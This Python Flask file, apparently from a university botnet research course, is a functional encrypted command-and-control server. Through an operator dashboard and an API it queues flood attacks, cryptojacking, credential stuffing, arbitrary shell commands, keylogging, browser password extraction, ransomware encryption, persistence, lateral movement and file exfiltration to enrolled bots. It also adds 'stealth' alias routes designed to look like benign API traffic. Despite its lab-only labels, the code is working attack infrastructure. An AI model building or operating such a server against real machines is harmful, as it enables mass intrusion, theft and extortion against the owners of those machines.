"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: AES-Encrypted C2 Server (Phase 1 upgrade)
 Environment: ISOLATED VM LAB ONLY
====================================================

Upgrade to c2_server.py: all commands encrypted with
AES-128-CBC before delivery to bots. Bot agents must
hold the shared key to decrypt task payloads.

Why encryption on an internal C2?
  - DPI cannot read task payloads in transit
  - If a bot is compromised, the task log is not readable
  - Research demonstration of command obfuscation

Key management in this demo:
  - Single shared key (pre-shared, compiled into bot)
  - Real botnets rotate keys via DGA or P2P updates

Usage: replaces c2_server.py on the C2 VM.
Bot agent uses crypto_utils.py to decrypt responses.

====================================================
 ADDITIONS from file-2 (merged into file-3 base)
====================================================
  - _copy_fields / _bot_online helpers
  - RESULT_LOG + _result_lock (last 200 results)
  - Result logging inside /result endpoint
  - Browser operator UI  (ported from C2_Server resource)
      GET  /ui              agent list dashboard
      GET  /ui/agents       alias for above
      GET  /ui/control      send-task form
      GET  /ui/results      recent result log
  - GET /results  JSON endpoint (last N results)
  - "shell" task type + extended field passthrough in /task
    (cmd, method, file_path, jump_target, ssh_user, nfs_share, secret)

====================================================
 ADDITIONS from file-3 (original base, kept intact)
====================================================
Gap 1 — Stealth alias routes:
         /api/status /api/upload /api/push /api/event
         /api/peers /api/rotate  delegate to real handlers.
Gap 2 — sleep task type handled before the general block.
       — sim module imports (keylogger, ransomware, etc.)
       — TASK_HANDLERS dispatch table.
"""

import os
import sys
import json
import base64
import hashlib
import threading
import time
import keylogger_sim
import cred_extractor_sim
import ransomware_sim
import anti_forensics_sim
import system_profiler
import persistence_sim
import file_transfer
from file_transfer import add_file_transfer_endpoints
from datetime import datetime
from queue import Queue
from flask import Flask, request, jsonify, render_template_string

# ── AES: reuse covert_bot or inline fallback ──────────────────
try:
    from covert_bot import aes_cbc_encrypt, aes_cbc_decrypt, derive_key, derive_iv
    print("[C2-AES] Using AES from covert_bot module")
except ImportError:
    def _pad(data, bs=16):
        p = bs - (len(data) % bs)
        return data + bytes([p] * p)

    def _unpad(data):
        if not data:
            return data
        p = data[-1]
        return data[:-p] if 0 < p <= 16 else data

    try:
        from Crypto.Cipher import AES as _AES
        def aes_cbc_encrypt(pt, key, iv):
            return _AES.new(key, _AES.MODE_CBC, iv).encrypt(_pad(pt))
        def aes_cbc_decrypt(ct, key, iv):
            return _unpad(_AES.new(key, _AES.MODE_CBC, iv).decrypt(ct))
    except ImportError:
        def aes_cbc_encrypt(pt, key, iv):
            print("[WARN] PyCryptodome not found – plaintext fallback")
            return pt
        def aes_cbc_decrypt(ct, key, iv):
            return ct

    def derive_key(secret=b"AUA_LAB_2026_KEY"):
        return hashlib.sha256(secret).digest()[:16]

    def derive_iv(nonce=""):
        return hashlib.md5(nonce.encode()).digest()

# ── C2 shared key ─────────────────────────────────────────────
C2_SECRET       = b"AUA_LAB_2026_KEY"   # Must match AUTH_TOKEN logic in bot_agent.c
AES_KEY         = derive_key(C2_SECRET)
AUTH_TOKEN      = "aw"
_current_secret = C2_SECRET
_current_key    = AES_KEY

# ── Encryption helpers ────────────────────────────────────────

def encrypt_task(task: dict) -> dict:
    """Encrypt a task dict for delivery to a bot using the current key."""
    nonce     = datetime.utcnow().strftime("%Y-%m-%d-%H-%M")
    iv        = derive_iv(nonce)
    plaintext = json.dumps(task).encode()
    ct        = aes_cbc_encrypt(plaintext, _current_key, iv)
    return {"enc": 1, "nonce": nonce, "data": base64.b64encode(ct).decode()}


def decrypt_task(payload: dict) -> dict | None:
    """Decrypt a task payload (used for testing/logging)."""
    if not payload.get("enc"):
        return payload
    try:
        iv = derive_iv(payload["nonce"])
        pt = aes_cbc_decrypt(base64.b64decode(payload["data"]), _current_key, iv)
        return json.loads(pt.decode())
    except Exception:
        return None

# ── General helpers ───────────────────────────────────────────

def _copy_fields(src: dict, dst: dict, fields: list):
    """Copy non-empty fields from src into dst."""
    for f in fields:
        v = src.get(f)
        if v is not None and v != "":
            dst[f] = v


def _bot_online(info: dict) -> bool:
    """True if bot last_seen within 60 s."""
    try:
        delta = (datetime.now() - datetime.fromisoformat(info["last_seen"])).total_seconds()
        return delta <= 60
    except Exception:
        return False

# ── Flask app ─────────────────────────────────────────────────
# MUST be created before any code that references `app`.

app = Flask(__name__)

# File-transfer endpoints (crash-fixed: now after app exists)
try:
    add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
    print("[C2] File transfer endpoints: /upload /download /uploads")
except Exception:
    print("[C2] INFO: file_transfer.py not found – /upload /download disabled")

# ── Shared state ──────────────────────────────────────────────
REGISTERED_BOTS = {}
TASK_QUEUES     = {}
RESULT_LOG      = []          # last 200 bot results (from file-2)
_result_lock    = threading.Lock()
_state_lock     = threading.Lock()


def log(msg):
    print(f"[C2-AES {datetime.now().strftime('%H:%M:%S')}] {msg}")


def _auth(req):
    return req.headers.get("X-Auth-Token") == AUTH_TOKEN


# ══════════════════════════════════════════════════════════════
#  WEB UI — HTML TEMPLATES  (ported from file-2 / C2_Server ref)
# ══════════════════════════════════════════════════════════════

_HOME = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>AUA C2</title><meta http-equiv="refresh" content="10">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:monospace;background:#111;color:#ccc;padding:16px}
h1{color:#4af;margin-bottom:10px;font-size:17px}
nav a{color:#4af;margin-right:14px;text-decoration:none;font-size:12px}
nav{border-bottom:1px solid #333;padding-bottom:8px;margin-bottom:14px}
table{border-collapse:collapse;width:100%;font-size:12px}
th{background:#1e1e1e;color:#8cf;padding:6px 10px;border:1px solid #333;text-align:left}
td{padding:5px 10px;border:1px solid #222}tr:nth-child(even){background:#141414}
.b{padding:2px 7px;border-radius:3px;font-size:11px;font-weight:700}
.enc{background:#1a2a4a;color:#8af}.plain{background:#2a1800;color:#fa8}
.on{background:#002200;color:#4f4}.off{background:#200;color:#f66}
.cards{display:flex;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.card{background:#181818;border:1px solid #333;padding:10px 16px;min-width:110px}
.cv{font-size:26px;color:#4af;font-weight:700}.cl{font-size:11px;color:#666;margin-top:2px}
.foot{margin-top:18px;font-size:11px;color:#444}
</style></head><body>
<h1>AUA CS 232/337 — C2 Dashboard</h1>
<nav>
  <a href="/ui">🏠 Home</a><a href="/ui/agents">🤖 Agents</a>
  <a href="/ui/control">⚡ Control</a><a href="/ui/results">📋 Results</a>
  <a href="/bots">JSON</a>
</nav>
<div class="cards">
  <div class="card"><div class="cv">{{total}}</div><div class="cl">Registered</div></div>
  <div class="card"><div class="cv">{{online}}</div><div class="cl">Online (≤60s)</div></div>
  <div class="card"><div class="cv">{{enc_c}}</div><div class="cl">AES-capable</div></div>
  <div class="card"><div class="cv">{{res_c}}</div><div class="cl">Results recv</div></div>
</div>
<h2 style="color:#8cf;font-size:13px;margin-bottom:6px">Agents</h2>
{% if bots %}
<table><tr><th>Bot ID</th><th>IP</th><th>Hostname</th><th>Arch</th>
<th>First Seen</th><th>Last Seen</th><th>HBs</th><th>Enc</th><th>Status</th></tr>
{% for bid,i in bots.items() %}
<tr><td>{{bid}}</td><td>{{i.ip}}</td><td>{{i.hostname}}</td><td>{{i.arch}}</td>
<td>{{i.first_seen[:19]}}</td><td>{{i.last_seen[:19]}}</td><td>{{i.heartbeat_count}}</td>
<td>{% if i.supports_enc %}<span class="b enc">AES</span>{% else %}<span class="b plain">PLAIN</span>{% endif %}</td>
<td>{% if i.online %}<span class="b on">ONLINE</span>{% else %}<span class="b off">OFFLINE</span>{% endif %}</td>
</tr>{% endfor %}</table>
{% else %}<p style="color:#555;font-size:13px">No agents yet.</p>{% endif %}
<p style="font-size:11px;color:#555;margin-top:6px">Auto-refreshes 10s.</p>
<div class="foot">ISOLATED ENVIRONMENT ONLY</div></body></html>"""

_CONTROL = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>C2 Control</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:monospace;background:#111;color:#ccc;padding:16px}
h1{color:#4af;margin-bottom:10px;font-size:17px}
nav a{color:#4af;margin-right:14px;text-decoration:none;font-size:12px}
nav{border-bottom:1px solid #333;padding-bottom:8px;margin-bottom:14px}
label{display:block;margin:6px 0 2px;font-size:12px;color:#8cf}
input,select,textarea{background:#1a1a1a;color:#ccc;border:1px solid #444;
  padding:6px 8px;width:100%;max-width:460px;font-family:monospace;font-size:12px}
button{margin-top:10px;padding:8px 20px;background:#1a4a8a;color:white;
  border:none;cursor:pointer;font-size:13px}
button:hover{background:#2255aa}
fieldset{border:1px solid #333;padding:10px 14px;margin-bottom:10px;max-width:500px}
legend{color:#8cf;font-size:12px;padding:0 6px}
.ok{background:#0a1a0a;border:1px solid #3a3;color:#4f4;padding:10px;
    margin-top:12px;font-size:12px;max-width:560px;white-space:pre-wrap;word-break:break-all}
.err{background:#1a0000;border:1px solid #933;color:#f66;padding:10px;
     margin-top:12px;font-size:12px;max-width:560px}
.hint{font-size:11px;color:#555;margin-top:3px}
.foot{margin-top:18px;font-size:11px;color:#444}
</style></head><body>
<h1>AUA CS 232/337 — C2 Control</h1>
<nav>
  <a href="/ui">🏠 Home</a><a href="/ui/agents">🤖 Agents</a>
  <a href="/ui/control">⚡ Control</a><a href="/ui/results">📋 Results</a>
</nav>
{% if sent %}<div class="ok">✅ Task queued:
{{sent|tojson(indent=2)}}</div>{% endif %}
{% if error %}<div class="err">❌ {{error}}</div>{% endif %}
<form method="POST" action="/ui/control">
<input type="hidden" name="auth" value="{{auth_token}}">
<fieldset><legend>Target</legend>
<label>Bot ID</label>
<select name="bot_id">
  <option value="all">all</option>
  {% for b in bots %}<option value="{{b}}">{{b}}</option>{% endfor %}
</select></fieldset>
<fieldset><legend>Task</legend>
<label>Task Type</label>
<select name="type" id="tt" onchange="sf()">
  <optgroup label="Attacks">
    <option value="syn_flood">syn_flood</option>
    <option value="udp_flood">udp_flood</option>
    <option value="slowloris">slowloris</option>
    <option value="cryptojack">cryptojack</option>
    <option value="cred_stuffing">cred_stuffing</option>
  </optgroup>
  <optgroup label="Shell / Keylogger / Creds">
    <option value="shell">shell — arbitrary command</option>
    <option value="start_keylogger">start_keylogger</option>
    <option value="stop_keylogger">stop_keylogger</option>
    <option value="get_keylogs">get_keylogs</option>
    <option value="clear_keylogs">clear_keylogs</option>
    <option value="extract_creds">extract_creds</option>
  </optgroup>
  <optgroup label="Ransomware">
    <option value="ransom_setup">ransom_setup</option>
    <option value="ransom_encrypt">ransom_encrypt</option>
    <option value="ransom_decrypt">ransom_decrypt</option>
    <option value="ransom_status">ransom_status</option>
    <option value="ransom_cleanup">ransom_cleanup</option>
  </optgroup>
  <optgroup label="Recon / Post-Exploitation">
    <option value="system_profile">system_profile</option>
    <option value="sandbox_check">sandbox_check</option>
    <option value="plant_persist">plant_persist</option>
    <option value="remove_persist">remove_persist</option>
    <option value="upload_file">upload_file</option>
    <option value="download_file">download_file</option>
    <option value="lateral_ssh">lateral_ssh</option>
    <option value="lateral_nfs">lateral_nfs</option>
    <option value="dga_search">dga_search</option>
    <option value="anti_forensics">anti_forensics</option>
    <option value="anti_forensics_status">anti_forensics_status</option>
  </optgroup>
  <optgroup label="Control">
    <option value="idle">idle</option>
    <option value="sleep">sleep — reconfigure beacon interval</option>
    <option value="stop_all">stop_all</option>
    <option value="shutdown">shutdown</option>
    <option value="update_secret">update_secret</option>
  </optgroup>
</select>
<div id="f-tgt"><label>Target IP</label><input name="target_ip" value="192.168.100.20"></div>
<div id="f-prt"><label>Target Port</label><input name="target_port" type="number" value="8080"></div>
<div id="f-dur"><label>Duration (s)</label><input name="duration" type="number" value="10"></div>
<div id="f-sh" style="display:none"><label>Shell Command</label>
  <input name="cmd" placeholder="e.g. id"><p class="hint">stdout/stderr returned via /result</p></div>
<div id="f-cpu" style="display:none"><label>CPU fraction (0-1)</label>
  <input name="cpu" type="number" value="0.25" step="0.05" min="0.01" max="1"></div>
<div id="f-cred" style="display:none">
  <label>Mode</label><select name="mode"><option>jitter</option><option>bot</option><option>distributed</option></select>
  <label>Workers</label><input name="workers" type="number" value="3">
  <label>Jitter ms</label><input name="jitter" type="number" value="200"></div>
<div id="f-mth" style="display:none"><label>Persistence Method</label>
  <select name="method"><option>cron</option><option>systemd</option><option>rc.local</option><option>bashrc</option></select></div>
<div id="f-fp" style="display:none"><label>File Path</label><input name="file_path" placeholder="/tmp/data.txt"></div>
<div id="f-ssh" style="display:none">
  <label>Jump Target IP</label><input name="jump_target" placeholder="192.168.100.30">
  <label>SSH User</label><input name="ssh_user" value="user"></div>
<div id="f-nfs" style="display:none"><label>NFS Share</label>
  <input name="nfs_share" placeholder="192.168.100.30:/export/share"></div>
<div id="f-sec" style="display:none"><label>New Secret (≥8 chars)</label>
  <input name="secret" placeholder="NEW_KEY_2026"></div>
<div id="f-slp" style="display:none">
  <label>Min interval (s)</label><input name="sleep_min" type="number" value="30">
  <label>Max interval (s)</label><input name="sleep_max" type="number" value="90"></div>
</fieldset>
<button type="submit">⚡ Queue Task</button>
</form>
<script>
function sf(){
 var t=document.getElementById('tt').value;
 var all=['f-tgt','f-prt','f-dur','f-cpu','f-cred','f-sh','f-mth','f-fp','f-ssh','f-nfs','f-sec','f-slp'];
 all.forEach(function(id){document.getElementById(id).style.display='none';});
 var s=[];
 if(['syn_flood','udp_flood','slowloris'].includes(t))s=['f-tgt','f-prt','f-dur'];
 if(t==='cryptojack')s=['f-dur','f-cpu'];
 if(t==='cred_stuffing')s=['f-tgt','f-prt','f-dur','f-cred'];
 if(t==='shell')s=['f-sh'];
 if(['system_profile','sandbox_check','dga_search',
     'start_keylogger','stop_keylogger','get_keylogs','clear_keylogs',
     'extract_creds','ransom_setup','ransom_encrypt','ransom_decrypt',
     'ransom_status','ransom_cleanup','anti_forensics','anti_forensics_status'].includes(t))s=['f-dur'];
 if(['plant_persist','remove_persist'].includes(t))s=['f-mth'];
 if(['upload_file','download_file'].includes(t))s=['f-fp'];
 if(t==='lateral_ssh')s=['f-tgt','f-ssh'];
 if(t==='lateral_nfs')s=['f-tgt','f-nfs'];
 if(t==='update_secret')s=['f-sec'];
 if(t==='sleep')s=['f-slp'];
 s.forEach(function(id){document.getElementById(id).style.display='block';});
}
sf();
</script>
<div class="foot">ISOLATED ENVIRONMENT ONLY</div></body></html>"""

_RESULTS = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>C2 Results</title><meta http-equiv="refresh" content="5">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:monospace;background:#111;color:#ccc;padding:16px}
h1{color:#4af;margin-bottom:10px;font-size:17px}
nav a{color:#4af;margin-right:14px;text-decoration:none;font-size:12px}
nav{border-bottom:1px solid #333;padding-bottom:8px;margin-bottom:14px}
.entry{background:#161616;border:1px solid #2a2a2a;padding:9px 13px;margin-bottom:7px}
.hdr{color:#8cf;font-size:11px;margin-bottom:3px}
pre{white-space:pre-wrap;word-break:break-all;color:#afa;font-size:11px}
.foot{margin-top:18px;font-size:11px;color:#444}
</style></head><body>
<h1>AUA CS 232/337 — Bot Results</h1>
<nav>
  <a href="/ui">🏠 Home</a><a href="/ui/agents">🤖 Agents</a>
  <a href="/ui/control">⚡ Control</a><a href="/ui/results">📋 Results</a>
</nav>
{% for r in results %}
<div class="entry">
  <div class="hdr">#{{loop.revindex}} — {{r.bot_id}}  @  {{r.ts[:19]}}</div>
  <pre>{{r.result_str}}</pre>
</div>
{% else %}<p style="color:#555">No results yet.</p>{% endfor %}
<p style="font-size:11px;color:#555;margin-top:6px">Auto-refreshes 5s.</p>
<div class="foot">ISOLATED ENVIRONMENT ONLY</div></body></html>"""


# ══════════════════════════════════════════════════════════════
#  WEB UI ROUTES
# ══════════════════════════════════════════════════════════════

@app.route("/ui")
@app.route("/ui/")
@app.route("/ui/agents")
def ui_home():
    with _state_lock:
        bots = {k: {**v, "online": _bot_online(v)} for k, v in REGISTERED_BOTS.items()}
    with _result_lock:
        res_c = len(RESULT_LOG)
    return render_template_string(
        _HOME,
        bots=bots,
        total=len(bots),
        online=sum(1 for v in bots.values() if v["online"]),
        enc_c=sum(1 for v in bots.values() if v.get("supports_enc")),
        res_c=res_c,
    )


@app.route("/ui/control", methods=["GET", "POST"])
def ui_control():
    with _state_lock:
        bots_list = list(REGISTERED_BOTS.keys())

    sent = error = None

    if request.method == "POST":
        form = request.form.to_dict()
        if form.get("auth") != AUTH_TOKEN:
            error = "Invalid auth token"
        else:
            try:
                task_type = form.get("type", "idle")
                bot_id    = form.get("bot_id", "all")

                # sleep task handled specially (Gap 2)
                if task_type == "sleep":
                    task = {
                        "type":      "sleep",
                        "min":       int(form.get("sleep_min", 30) or 30),
                        "max":       int(form.get("sleep_max", 90) or 90),
                        "issued_at": datetime.now().isoformat(),
                    }
                else:
                    task = {
                        "type":        task_type,
                        "target_ip":   form.get("target_ip", "192.168.100.20"),
                        "target_port": int(form.get("target_port", 8080) or 8080),
                        "duration":    int(form.get("duration", 10) or 10),
                        "issued_at":   datetime.now().isoformat(),
                    }
                    _copy_fields(form, task, [
                        "cpu", "mode", "jitter", "workers",
                        "cmd", "method", "file_path",
                        "jump_target", "ssh_user", "nfs_share", "secret",
                    ])

                with _state_lock:
                    targets = (list(REGISTERED_BOTS.keys())
                               if bot_id == "all" else [bot_id])
                    for tid in targets:
                        if tid in TASK_QUEUES:
                            TASK_QUEUES[tid].put(task)
                log(f"UI TASK type={task_type} target={bot_id}")
                sent = {"status": "queued", "task": task, "targets": targets}
            except Exception as exc:
                error = str(exc)

    return render_template_string(
        _CONTROL,
        bots=bots_list,
        sent=sent,
        error=error,
        auth_token=AUTH_TOKEN,
    )


@app.route("/ui/results")
def ui_results():
    with _result_lock:
        recent = list(reversed(RESULT_LOG[-50:]))
    return render_template_string(_RESULTS, results=recent)


# ══════════════════════════════════════════════════════════════
#  BOT API ENDPOINTS
# ══════════════════════════════════════════════════════════════

@app.route("/register", methods=["POST"])
def register():
    if not _auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")
    if not bot_id:
        return jsonify({"error": "no bot_id"}), 400

    with _state_lock:
        REGISTERED_BOTS[bot_id] = {
            "ip":              request.remote_addr,
            "hostname":        data.get("hostname", "unknown"),
            "arch":            data.get("arch", "unknown"),
            "first_seen":      datetime.now().isoformat(),
            "last_seen":       datetime.now().isoformat(),
            "heartbeat_count": 0,
            "supports_enc":    bool(data.get("enc", False)),
        }
        TASK_QUEUES[bot_id] = Queue()

    log(f"NEW BOT id={bot_id} ip={request.remote_addr} "
        f"enc={'yes' if data.get('enc') else 'no'}")
    return jsonify({"status": "registered", "bot_id": bot_id, "enc": True})


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    if not _auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")

    with _state_lock:
        if bot_id not in REGISTERED_BOTS:
            return jsonify({"error": "unknown bot"}), 404
        REGISTERED_BOTS[bot_id]["last_seen"]       = datetime.now().isoformat()
        REGISTERED_BOTS[bot_id]["heartbeat_count"] += 1
        task = None
        if not TASK_QUEUES[bot_id].empty():
            task = TASK_QUEUES[bot_id].get()

    if task:
        supports_enc = REGISTERED_BOTS.get(bot_id, {}).get("supports_enc", False)
        if supports_enc:
            log(f"HEARTBEAT id={bot_id} → ENCRYPTED task={task['type']}")
            return jsonify({"task": encrypt_task(task)})
        else:
            log(f"HEARTBEAT id={bot_id} → PLAINTEXT task={task['type']} (legacy bot)")
            return jsonify({"task": task})

    log(f"HEARTBEAT id={bot_id} → idle")
    return jsonify({"task": None})


@app.route("/result", methods=["POST"])
def result():
    if not _auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data           = request.get_json()
    bot_id         = data.get("bot_id")
    result_payload = data.get("result", "")

    if isinstance(result_payload, dict) and result_payload.get("enc"):
        dec        = decrypt_task(result_payload)
        result_str = json.dumps(dec)
        log(f"RESULT (decrypted) id={bot_id}  {result_str[:120]}")
    else:
        result_str = json.dumps(result_payload)
        log(f"RESULT id={bot_id}  {result_str[:120]}")

    with _result_lock:
        RESULT_LOG.append({
            "bot_id":     bot_id,
            "ts":         datetime.now().isoformat(),
            "result_str": result_str,
        })
        if len(RESULT_LOG) > 200:
            RESULT_LOG.pop(0)

    return jsonify({"status": "received"})


@app.route("/bots", methods=["GET"])
def list_bots():
    with _state_lock:
        return jsonify({k: v.copy() for k, v in REGISTERED_BOTS.items()})


@app.route("/results", methods=["GET"])
def list_results():
    """JSON: last N bot results (default 50, max 200). Consumed by /ui/results."""
    n = min(int(request.args.get("n", 50)), 200)
    with _result_lock:
        return jsonify(list(reversed(RESULT_LOG[-n:])))


@app.route("/task", methods=["POST"])
def push_task():
    """
    Push encrypted task to one or all bots.

    Required:
      bot_id  — "all" or specific bot_id
      type    — task type (see below)

    Attack tasks
    ─────────────────────────────────────────────────────────
    syn_flood       target_ip, target_port, duration
    udp_flood       target_ip, duration
    slowloris       target_ip, target_port, duration
    cryptojack      duration, cpu (0.0-1.0, default 0.25)
    cred_stuffing   target_ip, target_port, duration,
                    mode (bot|jitter|distributed),
                    jitter (ms, default 200), workers (default 3)

    Shell / arbitrary command
    ─────────────────────────────────────────────────────────
    shell           cmd  —  shell string executed by bot via
                    subprocess; stdout/stderr returned via /result.
                    Teaching point: Engine 12 (ProcWatch) detects
                    unexpected child processes of the agent PID.

    Keylogger / Credential extraction
    ─────────────────────────────────────────────────────────
    start_keylogger     Start evdev keyboard capture
    stop_keylogger      Stop keylogger
    get_keylogs         Retrieve captured keystrokes from bot
    clear_keylogs       Clear keylog buffer
    extract_creds       Extract browser saved passwords

    Ransomware simulation
    ─────────────────────────────────────────────────────────
    ransom_setup        Create ransomware test directory
    ransom_encrypt      Encrypt test files (AES-256-CBC)
    ransom_decrypt      Decrypt test files (key recovery)
    ransom_status       Show encryption state
    ransom_cleanup      Delete test directory

    Recon / post-exploitation
    ─────────────────────────────────────────────────────────
    system_profile      Full system enumeration (T1082/T1016/T1033)
    sandbox_check       VM/sandbox detection before payload delivery
    plant_persist       Install persistence. method: cron|systemd|rc.local|bashrc
    remove_persist      Remove previously planted persistence. method: same.
    upload_file         Bot reads file_path and POSTs to C2 /upload. (T1041)
    download_file       Bot GETs file_path from C2 /download. (T1105)
    lateral_ssh         SSH jump to jump_target:22 as ssh_user. (T1021.004)
    lateral_nfs         Mount nfs_share, write taint file. (T1570)
    dga_search          DGA domain sweep (fallback C2 locator)
    anti_forensics      Clear all lab-generated artifacts
    anti_forensics_status  List clearable lab artifacts

    Control
    ─────────────────────────────────────────────────────────
    idle            No-op.
    sleep           Remotely reconfigure bot poll interval.
                    min (s, default 30), max (s, default 90). (Gap 2)
    stop_all        Cancel all active attack threads.
    shutdown        Kill bot process.
    update_secret   Rotate AES key.  secret (min 8 chars).
    """
    data   = request.get_json()
    bot_id = data.get("bot_id", "all")

    # ── Gap 2: sleep task — handled before the general block ──
    if data.get("type") == "sleep":
        task = {
            "type":      "sleep",
            "min":       int(data.get("min", 30)),
            "max":       int(data.get("max", 90)),
            "issued_at": datetime.now().isoformat(),
        }
        with _state_lock:
            targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
            for tid in targets:
                if tid in TASK_QUEUES:
                    TASK_QUEUES[tid].put(task)
        log(f"TASK QUEUED type=sleep target={bot_id} "
            f"min={task['min']}s max={task['max']}s")
        return jsonify({"status": "queued", "task": task, "targets": targets})
    # ── end Gap 2 ─────────────────────────────────────────────

    task = {
        "type":        data.get("type", "idle"),
        "target_ip":   data.get("target_ip", "192.168.100.20"),
        "target_port": data.get("target_port", 8080),
        "duration":    data.get("duration", 10),
        "issued_at":   datetime.now().isoformat(),
    }

    TASK_HANDLERS = {
        "start_keylogger":       keylogger_sim.handle_c2_task,
        "stop_keylogger":        keylogger_sim.handle_c2_task,
        "get_keylogs":           keylogger_sim.handle_c2_task,
        "clear_keylogs":         keylogger_sim.handle_c2_task,
        "ransom_setup":          ransomware_sim.handle_c2_task,
        "ransom_encrypt":        ransomware_sim.handle_c2_task,
        "ransom_decrypt":        ransomware_sim.handle_c2_task,
        "ransom_status":         ransomware_sim.handle_c2_task,
        "ransom_cleanup":        ransomware_sim.handle_c2_task,
        "anti_forensics":        anti_forensics_sim.handle_c2_task,
        "anti_forensics_status": anti_forensics_sim.handle_c2_task,
        "system_profile":        system_profiler.handle_task,
    }

    # Pass through all type-specific optional fields if present
    _copy_fields(data, task, [
        # attack
        "cpu", "mode", "jitter", "workers",
        # shell (from file-2)
        "cmd",
        # persistence (from file-2)
        "method",
        # file transfer (from file-2)
        "file_path",
        # lateral movement (from file-2)
        "jump_target", "ssh_user",
        "nfs_share",
        # key rotation
        "secret",
    ])

    with _state_lock:
        targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
        for tid in targets:
            if tid in TASK_QUEUES:
                TASK_QUEUES[tid].put(task)

    log(f"TASK QUEUED type={task['type']} target={bot_id} "
        f"→ will be encrypted on delivery")
    return jsonify({"status": "queued", "task": task, "targets": targets})


@app.route("/encrypt_test", methods=["POST"])
def encrypt_test():
    """Debug endpoint: AES round-trip for a sample task using the current key."""
    task = request.get_json() or {"type": "idle"}
    enc  = encrypt_task(task)
    dec  = decrypt_task(enc)
    return jsonify({
        "original":  task,
        "encrypted": enc,
        "decrypted": dec,
        "key_hex":   _current_key.hex(),
    })


@app.route("/rotate_key", methods=["POST"])
def rotate_key():
    """
    Rotate the shared AES key used to encrypt tasks for bots.

    1. Derives the new AES key from the provided secret.
    2. Queues an 'update_secret' task for every registered bot,
       encrypted with the OLD key so current bots can decrypt it.
    3. Switches _current_key — all subsequent /task deliveries
       use the new key.

    Body:  {"secret": "<new_secret>"}  (min 8 chars)
    Requires X-Auth-Token header.

    Workflow:
      a. Call POST /rotate_key {"secret":"NEW_KEY"} on the C2 server.
         → All bots receive update_secret on their next heartbeat,
           still encrypted with the old key.
      b. Wait ≥ one heartbeat interval (5 s) for all bots to pick up
         the rotation command and switch their local key.
      c. All subsequent /task calls are now encrypted with the new key.

    If using the Phase 2 dead-drop server, also call:
      POST http://192.168.100.10:5001/push_key {"secret":"NEW_KEY"}
    so Phase 2 bots (covert_bot.py) receive the rotation too.
    """
    if not _auth(request):
        return jsonify({"error": "unauthorized"}), 403

    global _current_secret, _current_key

    data       = request.get_json(silent=True) or {}
    new_secret = data.get("secret", "")

    if not new_secret or len(new_secret) < 8:
        return jsonify({"error": "secret must be at least 8 characters"}), 400

    new_secret_bytes = new_secret.encode()
    new_key          = derive_key(new_secret_bytes)

    rotation_task = {
        "type":      "update_secret",
        "secret":    new_secret,
        "issued_at": datetime.now().isoformat(),
    }
    queued_count = 0
    with _state_lock:
        for q in TASK_QUEUES.values():
            q.put(rotation_task)
            queued_count += 1

    old_key_hex     = _current_key.hex()
    _current_secret = new_secret_bytes
    _current_key    = new_key

    log(f"KEY ROTATION: queued update_secret for {queued_count} bots | "
        f"old={old_key_hex[:8]}... new={new_key.hex()[:8]}...")

    return jsonify({
        "status":        "rotated",
        "bots_notified": queued_count,
        "new_key_hex":   new_key.hex(),
        "note": (
            "Bots will receive new key on next heartbeat (~5s). "
            "For Phase 2 bots, also call POST /push_key on the dead-drop server."
        ),
    })


# ══════════════════════════════════════════════════════════════
#  Gap 1 — STEALTH ALIAS ROUTES (from file-3, kept intact)
#
#  Alias table:
#    POST /api/event   →  register()
#    POST /api/status  →  heartbeat()
#    POST /api/upload  →  result()
#    POST /api/push    →  push_task()   (incl. sleep type)
#    GET  /api/peers   →  list_bots()
#    POST /api/rotate  →  rotate_key()
#
#  Teaching point: /api/status looks like an uptime check,
#  /api/upload like a log-shipping pipeline, /api/push like a
#  notification queue — none signal C2 to a network analyst.
# ══════════════════════════════════════════════════════════════

@app.route("/api/event",  methods=["POST"])
def api_event():   return register()

@app.route("/api/status", methods=["POST"])
def api_status():  return heartbeat()

@app.route("/api/upload", methods=["POST"])
def api_upload():  return result()

@app.route("/api/push",   methods=["POST"])
def api_push():    return push_task()

@app.route("/api/peers",  methods=["GET"])
def api_peers():   return list_bots()

@app.route("/api/rotate", methods=["POST"])
def api_rotate():  return rotate_key()


# ══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print(" Encrypted C2 Server - AUA Botnet Research Lab")
    print(" AES-128-CBC task encryption | ISOLATED ENVIRONMENT ONLY")
    print("=" * 60)
    print(f"\n[C2-AES] AES key: {_current_key.hex()}")
    print(f"\nBrowser UI:")
    print(f"  http://localhost:5000/ui           agent dashboard")
    print(f"  http://localhost:5000/ui/control   send task form")
    print(f"  http://localhost:5000/ui/results   bot result log")
    print(f"\nAPI:")
    print(f"  POST /register /heartbeat /result")
    print(f"  POST /task  GET /bots  GET /results")
    print(f"  POST /rotate_key  POST /encrypt_test")
    print(f"\nStealth aliases (Gap 1):")
    print(f"  POST /api/event /api/status /api/upload /api/push /api/rotate")
    print(f"  GET  /api/peers")
    print(f"\nKey rotation example:")
    print(f"  curl -X POST http://localhost:5000/rotate_key \\")
    print(f"       -H 'Content-Type: application/json' \\")
    print(f"       -H 'X-Auth-Token: aw' \\")
    print(f"       -d '{{\"secret\":\"NEW_KEY_2026_XYZ\"}}'")
    print(f"\nSleep task example (Gap 2):")
    print(f"  curl -X POST http://localhost:5000/api/push \\")
    print(f"       -H 'Content-Type: application/json' \\")
    print(f"       -H 'X-Auth-Token: aw' \\")
    print(f"       -d '{{\"bot_id\":\"all\",\"type\":\"sleep\",\"min\":120,\"max\":300}}'")
    print()
    app.run(host="0.0.0.0", port=5000, debug=False)